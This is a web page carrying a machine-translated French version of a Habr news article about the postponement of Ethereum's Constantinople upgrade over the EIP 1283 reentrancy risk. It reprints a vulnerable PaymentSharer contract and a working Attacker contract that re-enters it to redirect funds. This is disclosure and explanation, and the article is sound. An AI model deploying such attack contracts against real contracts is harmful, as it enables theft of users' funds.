<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>💆🏾 🤽 🚵🏾 * La mise à jour d'Ethereum "Constantinople" est reportée en raison d'une vulnérabilité potentielle trouvée au dernier moment 👩🏽‍🏫 👵🏻 👨‍👩‍👧‍👦</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="* Beaucoup de gens appellent cet événement un "hard fork", mais Vitalik est contre . 

 La libération tant attendue de Constantinople devait avoir lie...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>* La mise à jour d'Ethereum "Constantinople" est reportée en raison d'une vulnérabilité potentielle trouvée au dernier moment</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/436262/"><img src="https://habrastorage.org/getpro/habr/post_images/d53/c1f/e6f/d53c1fe6fac80caca00053e4f7139f60.jpg" alt="image"><br>  <i>* Beaucoup de gens appellent cet événement un "hard fork", mais Vitalik est <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">contre</a> .</i> <br><br>  La libération tant attendue de Constantinople devait avoir lieu <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">le 17 janvier à 4 heures du matin UTC</a> , mais une fois de plus, rompant brutalement la myriade d'armées de développeurs de <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">compteurs à compte à rebours,</a> cela ne se réalisera pas. <br><a name="habracut"></a><br>  30 heures avant la sortie officielle, en raison de la vulnérabilité constatée, guidée par le principe du "mieux entrelacer que de ne pas entrelacer", la mise à jour a été reportée sine die. <br><br>  Un événement qui a éveillé les oreilles de l'ensemble de la communauté a été l'offre téméraire de l' <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">EIP 1283</a> , qui réduit l'exécution de l'instruction SSTORE (sic!).  En général, l'une des principales directions de la mise à jour était la mise en œuvre moins coûteuse et plus rapide d'instructions particulièrement lourdes. <br><br>  Les événements du 15 janvier se sont déroulés <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">comme suit</a> (heure en PST): <br><br><ul><li>  à 8 h, ChainSecurity publie une <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">description de la vulnérabilité</a> ; </li><li>  là, Martin Holst Swende (le principal agent de sécurité de la Fondation Ethereum) réveille tous les développeurs clés, rappelant qu'il ne reste que 37 heures avant la mise à jour, et nous l'avons ici; </li><li>  avant midi, il y a un débat houleux dans les bavardoirs et la «voix»; </li><li>  Au dîner, il a été décidé d'annuler la mise à jour. </li></ul><br>  La situation a été aggravée par le fait que le temps de déploiement du navire a été extrêmement mal choisi: près de la moitié des nœuds ont réussi à être mis à jour, et tous les autres ont été méthodiquement et constamment bousculés au cours des dernières semaines.  En conséquence, maintenant les nœuds mis à jour devront être mis à jour à nouveau (soit vers le haut ou vers le bas ... mda).  Et qui n’avait pas le temps et dormait tout - bien fait, ils n’ont rien à faire. <br><br>  Ensuite, tout était prévisible - le marché a réagi avec un effondrement de 5% du taux d'éther (haha).  Beaucoup, bien sûr, étaient indignés de dire comment le prix de l'instruction peut affecter le secret, pourquoi l'avez-vous mis là et tout ça ... Mais en fait, rien d'inhabituel, tout est comme tout le monde. <br><br>  Il est préférable de lire les détails techniques de la vulnérabilité dans l'article original de <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">ChainSecurity</a> , il n'est pas difficile de le comprendre. <br><br>  Qui est trop paresseux pour plonger dans le code - le fait est qu'avant la mise à jour, l'instruction SSTORE était si chère qu'il n'y avait aucun moyen de changer «l'état» des autres contrats, après la mise à jour de Constantinople, l'instruction est devenue moins chère (et), et vous pouvez changer le «stockage» plusieurs fois, changeant ainsi la logique du contrat vulnérable. <br><br>  Code de contrat vulnérable (avec mes commentaires): <br><br><pre><code class="plaintext hljs">pragma solidity ^0.5.0; contract PaymentSharer { mapping(uint =&gt; uint) splits; mapping(uint =&gt; uint) deposits; mapping(uint =&gt; address payable) first; mapping(uint =&gt; address payable) second; //      ,       (  ) function init(uint id, address payable _first, address payable _second) public { require(first[id] == address(0) &amp;&amp; second[id] == address(0)); require(first[id] == address(0) &amp;&amp; second[id] == address(0)); first[id] = _first; second[id] = _second; } //    ,       function deposit(uint id) public payable { deposits[id] += msg.value; } //       function updateSplit(uint id, uint split) public { require(split &lt;= 100); splits[id] = split; } // ,  (     split) function splitFunds(uint id) public { // Here would be: // Signatures that both parties agree with this split // Split address payable a = first[id]; address payable b = second[id]; uint depo = deposits[id]; deposits[id] = 0; //     (    fallback-   ) a.transfer(depo * splits[id] / 100); //  -   (       ) b.transfer(depo * (100 - splits[id]) / 100); } }</code> </pre> <br>  Code de contrat d'attaque: <br><br><pre> <code class="plaintext hljs">pragma solidity ^0.5.0; import "./PaymentSharer.sol"; contract Attacker { address private victim; address payable owner; constructor() public { owner = msg.sender; } //    *,      PaymentSharer   function attack(address a) external { victim = a; PaymentSharer x = PaymentSharer(a); x.updateSplit(0, 100); x.splitFunds(0); } // fallback ,     transfer- function () payable external { address x = victim; // ,       (  ,   updateSplit(0, 0)), ..    Split          assembly{ mstore(0x80, 0xc3b18fb600000000000000000000000000000000000000000000000000000000) pop(call(10000, x, 0, 0x80, 0x44, 0, 0)) } } function drain() external { owner.transfer(address(this).balance); } }</code> </pre><br>  * dans l'original est manquant, mais quelque part il devrait y avoir une initialisation du formulaire: <br><blockquote>  init (0, «Adresse du contrat de l'attaquant», «Adresse du portefeuille de l'attaquant») </blockquote><br>  avant d'appeler la méthode d'attaque. <br><br>  Bien sûr, le contrat PaymentSharer lui-même soulève de nombreuses questions, sur lesquelles nous montrons une vulnérabilité, il est en soi aveugle de travers, et c'est en lui que le problème <br>  et pas dans le prix de SSTORE, et en général - dans le réseau de sortie, ils n'ont pas trouvé un seul exemple vivant, mais ont décidé de le jouer en toute sécurité, tout de même le prix de l'erreur peut être trop élevé (tout le monde se souvenait du DAO mort depuis longtemps ici). <br><br>  En général, la communauté Ethereum a beaucoup d'événements intéressants: la lutte des cardinaux du marché gris (GPU vs ASIC) s'est intensifiée, ce qui mérite en soi un article séparé, la sortie prochaine de Bacon Chain prend de l'ampleur - l'année promet d'être riche en événements et en intrigues. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/fr436262/">https://habr.com/ru/post/fr436262/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr436248/index.html">Filtre de Kalman</a></li>
<li><a href="../fr436250/index.html">Patrons suceurs de sang hors de leur contexte ou pourquoi ils échouent toujours</a></li>
<li><a href="../fr436254/index.html">Un bot pour Starcraft en rouille, C ou toute autre langue</a></li>
<li><a href="../fr436256/index.html">Obtenir un emploi en Allemagne sera plus facile</a></li>
<li><a href="../fr436260/index.html">Erreurs et pièges des startups dans le brevetage de leur propriété intellectuelle</a></li>
<li><a href="../fr436264/index.html">Mono-référentiels: veuillez ne pas le faire (partie 2)</a></li>
<li><a href="../fr436266/index.html">Mise à l'échelle extrême dans Alibaba JDK</a></li>
<li><a href="../fr436268/index.html">Nous collectons un jeu complet</a></li>
<li><a href="../fr436270/index.html">35% de l'audience Runet n'utilise pas du tout d'ordinateur pour Internet</a></li>
<li><a href="../fr436272/index.html">Programmation visuelle pour Sonoff Basic</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>